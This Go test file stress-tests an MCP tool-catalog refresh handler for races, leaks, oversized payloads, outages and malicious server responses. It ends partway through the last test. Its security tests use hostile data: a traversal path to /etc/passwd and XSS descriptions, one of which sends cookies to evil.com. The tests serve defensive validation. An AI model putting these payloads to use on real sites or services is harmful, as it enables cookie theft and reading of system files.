package mcp

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	mcpserver "github.com/mark3labs/mcp-go/server"
)

// =============================================================================
// Adversarial Stress Tests — MCP Catalog Auto-Refresh
//
// These tests target: race conditions, goroutine leaks, resource exhaustion,
// error cascading, security of server responses, and edge cases in the
// RefreshCatalog / watchServerVersion / Close lifecycle.
// =============================================================================

// --- Test Helpers ---

// mockVersionServer creates a controllable mock server for version and catalog endpoints.
// The caller can swap catalog and build atomically via the returned controls.
type mockServerCtrl struct {
	Build       atomic.Value // string
	CatalogJSON atomic.Value // string (JSON array)
	Requests    atomic.Int64
	srv         *httptest.Server
}

func newMockServer() *mockServerCtrl {
	ctrl := &mockServerCtrl{}
	ctrl.Build.Store("build-001")
	ctrl.CatalogJSON.Store(`[{"name":"tool_a","description":"Tool A","method":"GET","path":"/api/a","params":[]}]`)

	ctrl.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		ctrl.Requests.Add(1)
		switch r.URL.Path {
		case "/api/version":
			build := ctrl.Build.Load().(string)
			json.NewEncoder(w).Encode(map[string]string{
				"version": "1.0.0",
				"build":   build,
			})
		case "/api/mcp/tools":
			catalog := ctrl.CatalogJSON.Load().(string)
			w.Header().Set("Content-Type", "application/json")
			w.Write([]byte(catalog))
		default:
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	return ctrl
}

func (c *mockServerCtrl) Close()      { c.srv.Close() }
func (c *mockServerCtrl) URL() string { return c.srv.URL }

// newTestHandler creates a Handler wired to a mock server for refresh testing.
// Returns the handler and mock control. Caller must defer ctrl.Close() and h.Close().
func newTestHandler(t *testing.T, ctrl *mockServerCtrl) *Handler {
	t.Helper()
	cfg := testConfig()
	cfg.API.URL = ctrl.URL()

	h := NewHandler(cfg, testLogger())
	return h
}

// =============================================================================
// 1. Race Conditions
// =============================================================================

// TestRefreshCatalog_StressConcurrentReadWrite runs concurrent Catalog() reads
// and RefreshCatalog() writes to detect data races (run with -race).
func TestRefreshCatalog_StressConcurrentReadWrite(t *testing.T) {
	ctrl := newMockServer()
	defer ctrl.Close()

	h := newTestHandler(t, ctrl)
	defer h.Close()

	var wg sync.WaitGroup

	// 20 concurrent readers
	for i := 0; i < 20; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := 0; j < 50; j++ {
				catalog := h.Catalog()
				// Must never be nil — empty is acceptable
				if catalog == nil {
					t.Error("Catalog() returned nil during concurrent access")
				}
			}
		}()
	}

	// 5 concurrent writers
	for i := 0; i < 5; i++ {
		wg.Add(1)
		go func(n int) {
			defer wg.Done()
			for j := 0; j < 10; j++ {
				// Alternate catalog contents
				if j%2 == 0 {
					ctrl.CatalogJSON.Store(`[{"name":"tool_x","description":"X","method":"GET","path":"/api/x","params":[]}]`)
				} else {
					ctrl.CatalogJSON.Store(`[{"name":"tool_y","description":"Y","method":"POST","path":"/api/y","params":[]}]`)
				}
				_, _ = h.RefreshCatalog()
			}
		}(i)
	}

	wg.Wait()
}

// TestRefreshCatalog_StressConcurrentSetToolsAndCall tests that tool calls
// remain safe during a concurrent SetTools() refresh.
func TestRefreshCatalog_StressConcurrentSetToolsAndCall(t *testing.T) {
	ctrl := newMockServer()
	defer ctrl.Close()

	h := newTestHandler(t, ctrl)
	defer h.Close()

	var wg sync.WaitGroup

	// Concurrent refreshes
	for i := 0; i < 5; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := 0; j < 20; j++ {
				_, _ = h.RefreshCatalog()
			}
		}()
	}

	// Concurrent tool list reads via MCP protocol
	for i := 0; i < 10; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := 0; j < 20; j++ {
				// Catalog() should never panic
				c := h.Catalog()
				_ = len(c)
			}
		}()
	}

	wg.Wait()
}

// =============================================================================
// 2. Goroutine Leak Prevention
// =============================================================================

// TestHandlerClose_StressMultipleClose verifies Close() terminates the watcher goroutine
// and is safe to call multiple times (including a third call).
func TestHandlerClose_StressMultipleClose(t *testing.T) {
	ctrl := newMockServer()
	defer ctrl.Close()

	h := newTestHandler(t, ctrl)

	// Close once — must not block
	h.Close()

	// Close again — must not panic (double-close protection)
	h.Close()

	// Third time for good measure
	h.Close()
}

// TestHandlerClose_DuringActiveRefresh verifies Close() during an in-flight
// RefreshCatalog does not deadlock or panic.
func TestHandlerClose_DuringActiveRefresh(t *testing.T) {
	// Slow mock server that takes 500ms to respond to catalog requests
	var requestCount atomic.Int64
	slowServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requestCount.Add(1)
		switch r.URL.Path {
		case "/api/version":
			json.NewEncoder(w).Encode(map[string]string{"build": "slow-001"})
		case "/api/mcp/tools":
			time.Sleep(500 * time.Millisecond)
			w.Header().Set("Content-Type", "application/json")
			w.Write([]byte(`[{"name":"slow_tool","description":"Slow","method":"GET","path":"/api/slow","params":[]}]`))
		default:
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	defer slowServer.Close()

	cfg := testConfig()
	cfg.API.URL = slowServer.URL
	h := NewHandler(cfg, testLogger())

	// Start refresh in background
	done := make(chan struct{})
	go func() {
		_, _ = h.RefreshCatalog()
		close(done)
	}()

	// Close immediately while refresh is in-flight
	time.Sleep(50 * time.Millisecond)
	h.Close()

	// Wait for refresh to complete (context might cancel, that's OK)
	select {
	case <-done:
		// Refresh completed or errored — both acceptable
	case <-time.After(15 * time.Second):
		t.Fatal("RefreshCatalog blocked after Close()")
	}
}

// =============================================================================
// 3. Resource Exhaustion
// =============================================================================

// TestFetchServerBuild_HugeVersionResponse verifies that a malicious server
// returning a very large /api/version response does not cause OOM.
// The proxy already caps response bodies at maxResponseSize (50MB), but the
// version endpoint should be tiny. This tests the actual behavior.
func TestFetchServerBuild_HugeVersionResponse(t *testing.T) {
	// 10MB of padding in the version response
	hugeJSON := fmt.Sprintf(`{"build":"huge","padding":"%s"}`, strings.Repeat("x", 10<<20))

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/version":
			w.Header().Set("Content-Type", "application/json")
			w.Write([]byte(hugeJSON))
		case "/api/mcp/tools":
			w.Write([]byte(`[]`))
		default:
			w.WriteHeader(404)
		}
	}))
	defer srv.Close()

	cfg := testConfig()
	cfg.API.URL = srv.URL
	h := NewHandler(cfg, testLogger())
	defer h.Close()

	// fetchServerBuild should still work (the proxy reads the body, but JSON parse picks out "build")
	build := h.fetchServerBuild()
	if build != "huge" {
		t.Logf("fetchServerBuild with 10MB response: build=%q (empty is acceptable if it rejects large payloads)", build)
	}
}

// TestRefreshCatalog_HugeCatalog verifies the 1MB catalog size limit from FetchCatalog.
func TestRefreshCatalog_HugeCatalog(t *testing.T) {
	// Generate catalog > 1MB
	bigCatalog := strings.Repeat(`{"name":"tool","method":"GET","path":"/api/x","params":[]},`, 20000)
	bigCatalog = "[" + bigCatalog[:len(bigCatalog)-1] + "]"

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/version":
			json.NewEncoder(w).Encode(map[string]string{"build": "big-001"})
		case "/api/mcp/tools":
			w.Header().Set("Content-Type", "application/json")
			w.Write([]byte(bigCatalog))
		default:
			w.WriteHeader(404)
		}
	}))
	defer srv.Close()

	cfg := testConfig()
	cfg.API.URL = srv.URL
	h := NewHandler(cfg, testLogger())
	defer h.Close()

	count, err := h.RefreshCatalog()
	if err == nil {
		t.Errorf("expected error for oversized catalog during refresh, got count=%d", count)
	}
	if err != nil && !strings.Contains(err.Error(), "too large") {
		t.Errorf("expected 'too large' error, got: %v", err)
	}

	// Original catalog should be preserved after failed refresh
	catalog := h.Catalog()
	t.Logf("Catalog preserved after failed refresh: %d tools", len(catalog))
}

// =============================================================================
// 4. Error Cascading — Server Flapping
// =============================================================================

// TestTriggerRefresh_ServerFlapping tests rapid up/down cycles: the watcher should
// handle errors gracefully without corrupting state.
func TestTriggerRefresh_ServerFlapping(t *testing.T) {
	var serverUp atomic.Bool
	serverUp.Store(true)

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !serverUp.Load() {
			w.WriteHeader(http.StatusServiceUnavailable)
			w.Write([]byte(`{"error":"server down"}`))
			return
		}
		switch r.URL.Path {
		case "/api/version":
			json.NewEncoder(w).Encode(map[string]string{"build": "flap-001"})
		case "/api/mcp/tools":
			w.Header().Set("Content-Type", "application/json")
			w.Write([]byte(`[{"name":"stable_tool","description":"Stable","method":"GET","path":"/api/stable","params":[]}]`))
		default:
			w.WriteHeader(404)
		}
	}))
	defer srv.Close()

	cfg := testConfig()
	cfg.API.URL = srv.URL
	h := NewHandler(cfg, testLogger())
	defer h.Close()

	// Initial state should have tools
	initial := h.Catalog()

	// Flap the server rapidly
	for i := 0; i < 20; i++ {
		serverUp.Store(i%2 == 0)
		_, _ = h.RefreshCatalog()
	}

	// After flapping, leave server up and refresh
	serverUp.Store(true)
	count, err := h.RefreshCatalog()
	if err != nil {
		t.Errorf("expected successful refresh after server stabilizes, got: %v", err)
	}

	catalog := h.Catalog()
	t.Logf("After flapping: initial=%d, final=%d, count=%d", len(initial), len(catalog), count)
}

// TestRefreshCatalog_ServerReturns503ThenRecovers tests graceful degradation.
func TestRefreshCatalog_ServerReturns503ThenRecovers(t *testing.T) {
	var requestNum atomic.Int64

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		n := requestNum.Add(1)
		switch r.URL.Path {
		case "/api/version":
			json.NewEncoder(w).Encode(map[string]string{"build": "recover-001"})
		case "/api/mcp/tools":
			if n <= 3 {
				w.WriteHeader(http.StatusServiceUnavailable)
				w.Write([]byte(`{"error":"service unavailable"}`))
				return
			}
			w.Header().Set("Content-Type", "application/json")
			w.Write([]byte(`[{"name":"recovered","description":"Back","method":"GET","path":"/api/back","params":[]}]`))
		default:
			w.WriteHeader(404)
		}
	}))
	defer srv.Close()

	cfg := testConfig()
	cfg.API.URL = srv.URL
	h := NewHandler(cfg, testLogger())
	defer h.Close()

	// First few refreshes should fail
	_, err := h.RefreshCatalog()
	if err == nil {
		t.Log("First refresh succeeded (server already past threshold)")
	}

	// Eventually should succeed
	var lastErr error
	for i := 0; i < 5; i++ {
		_, lastErr = h.RefreshCatalog()
		if lastErr == nil {
			break
		}
	}
	if lastErr != nil {
		t.Errorf("expected eventual recovery, still failing: %v", lastErr)
	}
}

// =============================================================================
// 5. Security — Malicious Server Responses
// =============================================================================

// TestRefreshCatalog_PathTraversalInToolPath verifies that catalog validation
// rejects tools with path traversal attempts during refresh.
func TestRefreshCatalog_PathTraversalInToolPath(t *testing.T) {
	maliciousCatalog := `[
		{"name":"evil_tool","description":"<script>alert(1)</script>","method":"GET","path":"/api/../../../etc/passwd","params":[]},
		{"name":"good_tool","description":"Good","method":"GET","path":"/api/good","params":[]}
	]`

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/version":
			json.NewEncoder(w).Encode(map[string]string{"build": "evil-001"})
		case "/api/mcp/tools":
			w.Header().Set("Content-Type", "application/json")
			w.Write([]byte(maliciousCatalog))
		default:
			w.WriteHeader(404)
		}
	}))
	defer srv.Close()

	cfg := testConfig()
	cfg.API.URL = srv.URL
	h := NewHandler(cfg, testLogger())
	defer h.Close()

	count, err := h.RefreshCatalog()
	if err != nil {
		t.Fatalf("refresh should succeed (with filtered tools): %v", err)
	}

	// Only good_tool should survive validation
	catalog := h.Catalog()
	for _, tool := range catalog {
		if strings.Contains(tool.Path, "..") {
			t.Errorf("SECURITY: path traversal tool survived validation: %s -> %s", tool.Name, tool.Path)
		}
		if !strings.HasPrefix(tool.Path, "/api/") {
			t.Errorf("SECURITY: tool with invalid path prefix survived: %s -> %s", tool.Name, tool.Path)
		}
	}
	t.Logf("After malicious catalog: %d tools registered (count=%d)", len(catalog), count)
}

// TestRefreshCatalog_XSSInDescriptions verifies that tool descriptions with
// XSS payloads are stored as-is (the catalog is data, not HTML — rendering
// must escape). This documents the behavior.
func TestRefreshCatalog_XSSInDescriptions(t *testing.T) {
	xssCatalog := `[
		{"name":"xss_tool","description":"<img onerror=alert(1) src=x>","method":"GET","path":"/api/xss","params":[]},
		{"name":"script_tool","description":"<script>document.location='http://evil.com/?c='+document.cookie</script>","method":"GET","path":"/api/script","params":[]}
	]`

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/version":
			json.NewEncoder(w).Encode(map[string]string{"build": "xss-001"})
		case "/api/mcp/tools":
			w.Header().Set("Content-Type", "application/json")
			w.Write([]byte(xssCatalog))
		default:
			w.WriteHeader(404)
		}
	}))
	defer srv.Close()

	cfg := testConfig()
	cfg.API.URL = srv.URL
	h := NewHandler(cfg, testLogger())
	defer h.Close()

	_, err := h.RefreshCatalog()
	if err != nil {
		t.Fatalf("refresh failed: %v", err)
	}

	// XSS descriptions pass validation (they're not paths). This is expected.
	// The MCP page template MUST html-escape descriptions at render time.
	catalog := h.Catalog()
	for _, tool := range catalog {
		if strings.Contains(tool.Description, "<script>") || strings.Contains(tool.Description, "onerror=") {
			t.Logf("FINDING: XSS payload in tool description stored as-is: %s -> %q. "+
				"Template rendering MUST html-escape this.", tool.Name, tool.Description)
		}
	}
}

// TestRefreshCatalog_InvalidMethodBypass verifies unsupported HTTP methods
// are rejected during refresh.
func TestRefreshCatalog_InvalidMethodBypass(t *testing.T) {
	badMethods := `[
		{"name":"trace_tool","description":"TRACE","method":"TRACE","path":"/api/trace","params":[]},
		{"name":"options_tool","description":"OPTIONS","method":"OPTIONS","path":"/api/options","params":[]},
		{"name":"connect_tool","description":"CONNECT","method":"CONNECT","path":"/api/connect","params":[]},
		{"name":"valid_tool","description":"Valid GET","method":"GET","path":"/api/valid","params":[]}
	]`

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/version":
			json.NewEncoder(w).Encode(map[string]string{"build": "method-001"})
		case "/api/mcp/tools":
			w.Header().Set("Content-Type", "application/json")
			w.Write([]byte(badMethods))
		default:
			w.WriteHeader(404)
		}
	}))
	defer srv.Close()

	cfg := testConfig()
	cfg.API.URL = srv.URL
	h := NewHandler(cfg, testLogger())
	defer h.Close()

	_, err := h.RefreshCatalog()
	if err != nil {
		t.Fatalf("refresh should succeed (with filtered tools): %v", err)
	}

	catalog := h.Catalog()
	for _, tool := range catalog {
		upper := strings.ToUpper(tool.Method)
		if upper == "TRACE" || upper == "OPTIONS" || upper == "CONNECT" {
			t.Errorf("SECURITY: unsupported method %q survived validation: %s", tool.Method, tool.Name)
		}
	}
	// Should only have valid_tool
	if len(catalog) != 1 {
		t.Errorf("expected 1 valid tool, got %d", len(catalog))
	}
}

// =============================================================================
// 6. Edge Cases
// =============================================================================

// TestRefreshCatalog_EmptyCatalogAfterRefresh tests that refreshing to an
// empty catalog (all tools removed on server) works correctly.
func TestRefreshCatalog_EmptyCatalogAfterRefresh(t *testing.T) {
	ctrl := newMockServer()
	defer ctrl.Close()

	h := newTestHandler(t, ctrl)
	defer h.Close()

	// Start with tools
	initial := h.Catalog()
	if len(initial) == 0 {
		t.Log("no initial tools (server may have been unreachable at startup)")
	}

	// Refresh with empty catalog
	ctrl.CatalogJSON.Store(`[]`)
	count, err := h.RefreshCatalog()
	if err != nil {
		t.Fatalf("refresh to empty catalog failed: %v", err)
	}
	if count != 0 {
		t.Errorf("expected 0 tools after empty catalog refresh, got %d", count)
	}

	catalog := h.Catalog()
	if len(catalog) != 0 {
		t.Errorf("expected empty catalog, got %d tools", len(catalog))
	}
}

// TestRefreshCatalog_DuplicateToolNames verifies duplicate tool names in the
// refreshed catalog are deduplicated.
func TestRefreshCatalog_DuplicateToolNames(t *testing.T) {
	dupCatalog := `[
		{"name":"dup_tool","description":"First","method":"GET","path":"/api/first","params":[]},
		{"name":"dup_tool","description":"Second","method":"POST","path":"/api/second","params":[]},
		{"name":"unique_tool","description":"Unique","method":"GET","path":"/api/unique","params":[]}
	]`

	ctrl := newMockServer()
	defer ctrl.Close()
	ctrl.CatalogJSON.Store(dupCatalog)

	h := newTestHandler(t, ctrl)
	defer h.Close()

	count, err := h.RefreshCatalog()
	if err != nil {
		t.Fatalf("refresh failed: %v", err)
	}

	catalog := h.Catalog()
	names := map[string]int{}
	for _, tool := range catalog {
		names[tool.Name]++
	}

	if names["dup_tool"] > 1 {
		t.Errorf("FINDING: duplicate tool name survived: dup_tool appeared %d times", names["dup_tool"])
	}
	t.Logf("After dedup: count=%d, catalog=%d tools, names=%v", count, len(catalog), names)
}

// TestRefreshCatalog_GetVersionOverride verifies that get_version from the
// catalog is overridden by the portal's combined version handler.
func TestRefreshCatalog_GetVersionOverride(t *testing.T) {
	catalogWithVersion := `[
		{"name":"get_version","description":"Server-only version","method":"GET","path":"/api/version","params":[]},
		{"name":"other_tool","description":"Other","method":"GET","path":"/api/other","params":[]}
	]`

	ctrl := newMockServer()
	defer ctrl.Close()
	ctrl.CatalogJSON.Store(catalogWithVersion)

	h := newTestHandler(t, ctrl)
	defer h.Close()

	_, err := h.RefreshCatalog()
	if err != nil {
		t.Fatalf("refresh failed: %v", err)
	}

	// The catalog returned by Catalog() is the validated server catalog.
	// get_version from the server catalog is valid and will be in the list.
	// But the MCP tools list should have our overridden combined handler.
	// The spec says get_version is always appended last to tools list, winning in map.
	catalog := h.Catalog()
	t.Logf("Catalog after refresh with get_version: %d tools", len(catalog))
}

// TestRefreshCatalog_PreservesOriginalOnError verifies that a failed refresh
// does not corrupt the existing catalog.
func TestRefreshCatalog_PreservesOriginalOnError(t *testing.T) {
	ctrl := newMockServer()
	defer ctrl.Close()

	h := newTestHandler(t, ctrl)
	defer h.Close()

	// Capture initial catalog
	initial := h.Catalog()
	initialCount := len(initial)

	// Make server return error
	ctrl.srv.Close()

	// Refresh should fail
	_, err := h.RefreshCatalog()
	if err == nil {
		t.Fatal("expected error when server is closed")
	}

	// Original catalog should be preserved
	after := h.Catalog()
	if len(after) != initialCount {
		t.Errorf("catalog corrupted after failed refresh: had %d tools, now have %d", initialCount, len(after))
	}
}

// TestFetchServerBuild_MalformedJSON verifies fetchServerBuild handles
// garbage JSON gracefully.
func TestFetchServerBuild_MalformedJSON(t *testing.T) {
	badResponses := []struct {
		name    string
		payload string
	}{
		{"not_json", "this is not json"},
		{"html", "<html><body>502 Bad Gateway</body></html>"},
		{"empty_object", `{}`},
		{"null", `null`},
		{"array", `["not","an","object"]`},
		{"nested_build", `{"data":{"build":"nested"}}`},
		{"numeric_build", `{"build":12345}`},
		{"null_build", `{"build":null}`},
		{"empty_build", `{"build":""}`},
	}

	for _, tc := range badResponses {
		t.Run(tc.name, func(t *testing.T) {
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				switch r.URL.Path {
				case "/api/version":
					w.Write([]byte(tc.payload))
				case "/api/mcp/tools":
					w.Write([]byte(`[]`))
				default:
					w.WriteHeader(404)
				}
			}))
			defer srv.Close()

			cfg := testConfig()
			cfg.API.URL = srv.URL
			h := NewHandler(cfg, testLogger())
			defer h.Close()

			build := h.fetchServerBuild()
			t.Logf("payload=%q -> build=%q", tc.name, build)

			// All malformed responses should return empty string (except empty_object -> "")
			// The point is: no panics, no crashes
		})
	}
}

// TestFetchServerBuild_SlowServer verifies the 5s timeout on version fetch.
func TestFetchServerBuild_SlowServer(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/version":
			// Deliberately slow — should timeout
			time.Sleep(10 * time.Second)
			json.NewEncoder(w).Encode(map[string]string{"build": "never-seen"})
		case "/api/mcp/tools":
			w.Write([]byte(`[]`))
		default:
			w.WriteHeader(404)
		}
	}))
	defer srv.Close()

	cfg := testConfig()
	cfg.API.URL = srv.URL
	h := NewHandler(cfg, testLogger())
	defer h.Close()

	start := time.Now()
	build := h.fetchServerBuild()
	elapsed := time.Since(start)

	if build != "" {
		t.Errorf("expected empty build from slow server, got %q", build)
	}
	// Should timeout within ~6s (5s timeout + overhead)
	if elapsed > 8*time.Second {
		t.Errorf("fetchServerBuild took too long: %v (expected ~5s timeout)", elapsed)
	}
	t.Logf("fetchServerBuild timeout: build=%q, elapsed=%v", build, elapsed)
}

// TestRefreshCatalog_ContextTimeout verifies RefreshCatalog uses its own 10s
// timeout and doesn't hang forever.
func TestRefreshCatalog_ContextTimeout(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/version":
			json.NewEncoder(w).Encode(map[string]string{"build": "timeout-001"})
		case "/api/mcp/tools":
			// Hang until client cancels — simulates slow server
			select {
			case <-r.Context().Done():
				// Client timed out, return without writing
			case <-time.After(30 * time.Second):
				w.Write([]byte(`[]`))
			}
		default:
			w.WriteHeader(404)
		}
	}))
	defer srv.Close()

	cfg := testConfig()
	cfg.API.URL = srv.URL
	cfg.MCP.CatalogRetries = 0 // Skip initial catalog fetch so NewHandler doesn't hang
	h := NewHandler(cfg, testLogger())
	defer h.Close()

	start := time.Now()
	_, err := h.RefreshCatalog()
	elapsed := time.Since(start)

	if err == nil {
		t.Error("expected timeout error from slow catalog fetch")
	}
	if elapsed > 15*time.Second {
		t.Errorf("RefreshCatalog took too long: %v (expected ~10s timeout)", elapsed)
	}
	t.Logf("RefreshCatalog timeout: err=%v, elapsed=%v", err, elapsed)
}

// =============================================================================
// 7. watchServerVersion Integration
// =============================================================================

// TestWatchServerVersion_DetectsBuildChange verifies the watcher detects a
// build field change and triggers a refresh.
func TestWatchServerVersion_DetectsBuildChange(t *testing.T) {
	ctrl := newMockServer()
	defer ctrl.Close()

	h := newTestHandler(t, ctrl)
	defer h.Close()

	// Initial catalog from startup
	initial := h.Catalog()

	// Change both build and catalog on the mock server
	ctrl.Build.Store("build-002")
	ctrl.CatalogJSON.Store(`[
		{"name":"new_tool_a","description":"New A","method":"GET","path":"/api/new_a","params":[]},
		{"name":"new_tool_b","description":"New B","method":"POST","path":"/api/new_b","params":[]}
	]`)

	// Directly call triggerRefresh (testing the refresh path, not the timer)
	h.triggerRefresh("build-002")

	updated := h.Catalog()
	if len(updated) == len(initial) {
		// Could be same length if initial also had the right number
		t.Logf("Catalog length unchanged: initial=%d, updated=%d", len(initial), len(updated))
	}

	// Verify new tools are present
	found := false
	for _, tool := range updated {
		if tool.Name == "new_tool_a" || tool.Name == "new_tool_b" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected new tools after triggerRefresh, catalog was not updated")
	}
}

// =============================================================================
// 8. NewHandler Lifecycle
// =============================================================================

// TestNewHandler_ServerUnreachable verifies NewHandler gracefully handles
// a server that is down at startup.
func TestNewHandler_ServerUnreachable(t *testing.T) {
	cfg := testConfig()
	cfg.API.URL = "http://127.0.0.1:1" // Nothing listening
	cfg.MCP.CatalogRetries = 1         // Fast failure

	h := NewHandler(cfg, testLogger())
	defer h.Close()

	catalog := h.Catalog()
	if len(catalog) != 0 {
		t.Errorf("expected 0 tools when server unreachable, got %d", len(catalog))
	}
}

// TestNewHandler_NilCatalogNotReturned verifies Catalog() never returns nil.
func TestNewHandler_NilCatalogNotReturned(t *testing.T) {
	cfg := testConfig()
	cfg.API.URL = mockAPIServer.URL // Returns 503
	cfg.MCP.CatalogRetries = 1

	h := NewHandler(cfg, testLogger())
	defer h.Close()

	catalog := h.Catalog()
	if catalog == nil {
		t.Error("Catalog() must never return nil, should return empty slice")
	}
}

// =============================================================================
// 9. Catalog Mutation Safety
// =============================================================================

// TestCatalog_ReturnsCopy verifies that modifying the returned catalog slice
// does not affect the internal state.
func TestCatalog_ReturnsCopy(t *testing.T) {
	ctrl := newMockServer()
	defer ctrl.Close()

	h := newTestHandler(t, ctrl)
	defer h.Close()

	catalog1 := h.Catalog()
	originalLen := len(catalog1)

	// Mutate the returned slice
	if len(catalog1) > 0 {
		catalog1[0].Name = "MUTATED"
		catalog1 = append(catalog1, CatalogTool{Name: "injected"})
	}

	// Fetch again — must be unaffected
	catalog2 := h.Catalog()
	if len(catalog2) != originalLen {
		t.Errorf("internal catalog was mutated via returned slice: original=%d, now=%d", originalLen, len(catalog2))
	}
	for _, tool := range catalog2 {
		if tool.Name == "MUTATED" || tool.Name == "injected" {
			t.Errorf("SECURITY: internal catalog state leaked through returned copy: found %q", tool.Name)
		}
	}
}

// =============================================================================
// 10. Catalog Page Display (catalogAdapter) during refresh
// =============================================================================

// TestCatalogAdapter_DuringRefresh verifies the MCP page adapter function
// produces consistent results during concurrent refreshes.
func TestCatalogAdapter_DuringRefresh(t *testing.T) {
	ctrl := newMockServer()
	defer ctrl.Close()

	h := newTestHandler(t, ctrl)
	defer h.Close()

	var wg sync.WaitGroup

	// Concurrent catalog reads (simulating page renders)
	for i := 0; i < 20; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := 0; j < 50; j++ {
				catalog := h.Catalog()
				// Should be a valid snapshot
				for _, tool := range catalog {
					if tool.Name == "" {
						t.Error("empty tool name in catalog snapshot")
					}
				}
			}
		}()
	}

	// Concurrent refreshes
	for i := 0; i < 3; i++ {
		wg.Add(1)
		go func(n int) {
			defer wg.Done()
			for j := 0; j < 10; j++ {
				ctrl.CatalogJSON.Store(fmt.Sprintf(
					`[{"name":"tool_%d_%d","description":"Dynamic","method":"GET","path":"/api/dyn","params":[]}]`,
					n, j,
				))
				_, _ = h.RefreshCatalog()
			}
		}(i)
	}

	wg.Wait()
}

// =============================================================================
// 11. validateJWT — Ensure Bearer tokens validated during refresh context
// =============================================================================

// TestRefreshCatalog_NoAuthOnInternalRequests verifies that RefreshCatalog
// internal proxy calls do NOT include user-specific auth headers (the refresh
// is a system-level operation, not tied to a specific user session).
func TestRefreshCatalog_NoAuthOnInternalRequests(t *testing.T) {
	var authHeaders []string
	var mu sync.Mutex

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		if h := r.Header.Get("Authorization"); h != "" {
			authHeaders = append(authHeaders, h)
		}
		mu.Unlock()

		switch r.URL.Path {
		case "/api/version":
			json.NewEncoder(w).Encode(map[string]string{"build": "auth-001"})
		case "/api/mcp/tools":
			w.Header().Set("Content-Type", "application/json")
			w.Write([]byte(`[{"name":"auth_test","description":"Auth","method":"GET","path":"/api/auth","params":[]}]`))
		default:
			w.WriteHeader(404)
		}
	}))
	defer srv.Close()

	cfg := testConfig()
	cfg.API.URL = srv.URL
	h := NewHandler(cfg, testLogger())
	defer h.Close()

	_, err := h.RefreshCatalog()
	if err != nil {
		t.Fatalf("refresh failed: %v", err)
	}

	mu.Lock()
	defer mu.Unlock()
	if len(authHeaders) > 0 {
		t.Logf("FINDING: RefreshCatalog proxy requests included Authorization headers: %v. "+
			"This is expected to use config-level X-Vire-* headers only, not user Bearer tokens.", authHeaders)
	}
}

// =============================================================================
// 12. Concurrent Close + Refresh safety
// =============================================================================

// TestConcurrentCloseAndRefresh verifies that calling Close() and RefreshCatalog()
// concurrently does not panic, deadlock, or corrupt state.
func TestConcurrentCloseAndRefresh(t *testing.T) {
	ctrl := newMockServer()
	defer ctrl.Close()

	h := newTestHandler(t, ctrl)

	var wg sync.WaitGroup

	// Close from multiple goroutines
	for i := 0; i < 5; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			h.Close()
		}()
	}

	// Refresh from multiple goroutines
	for i := 0; i < 5; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			_, _ = h.RefreshCatalog()
		}()
	}

	// Catalog reads
	for i := 0; i < 10; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			_ = h.Catalog()
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		// All goroutines completed — success
	case <-time.After(15 * time.Second):
		t.Fatal("concurrent Close/Refresh/Catalog deadlocked")
	}
}

// =============================================================================
// 13. MCPServer.SetTools integration
// =============================================================================

// TestSetTools_AtomicReplacement verifies that SetTools atomically replaces
// all tools (not AddTool which appends).
func TestSetTools_AtomicReplacement(t *testing.T) {
	mcpSrv := mcpserver.NewMCPServer("test", "1.0.0", mcpserver.WithToolCapabilities(true))

	// Register initial tools
	proxy := NewMCPProxy(mockAPIServer.URL, testLogger(), testConfig())
	initialCatalog := []CatalogTool{
		{Name: "tool_a", Description: "A", Method: "GET", Path: "/api/a"},
		{Name: "tool_b", Description: "B", Method: "POST", Path: "/api/b"},
	}
	RegisterToolsFromCatalog(mcpSrv, proxy, initialCatalog)
	mcpSrv.AddTool(VersionTool(), VersionToolHandler(proxy))

	tools := listTools(t, mcpSrv)
	initialToolCount := len(tools)
	t.Logf("Initial tool count: %d", initialToolCount)

	// Now use SetTools to atomically replace with a different set
	newCatalog := []CatalogTool{
		{Name: "tool_x", Description: "X", Method: "GET", Path: "/api/x"},
	}
	newTools := make([]mcpserver.ServerTool, 0, len(newCatalog)+1)
	for _, ct := range newCatalog {
		newTools = append(newTools, mcpserver.ServerTool{
			Tool:    BuildMCPTool(ct),
			Handler: GenericToolHandler(proxy, ct),
		})
	}
	newTools = append(newTools, mcpserver.ServerTool{
		Tool:    VersionTool(),
		Handler: VersionToolHandler(proxy),
	})
	mcpSrv.SetTools(newTools...)

	updatedTools := listTools(t, mcpSrv)
	t.Logf("After SetTools: %d tools", len(updatedTools))

	// Old tools should be gone
	for _, tool := range updatedTools {
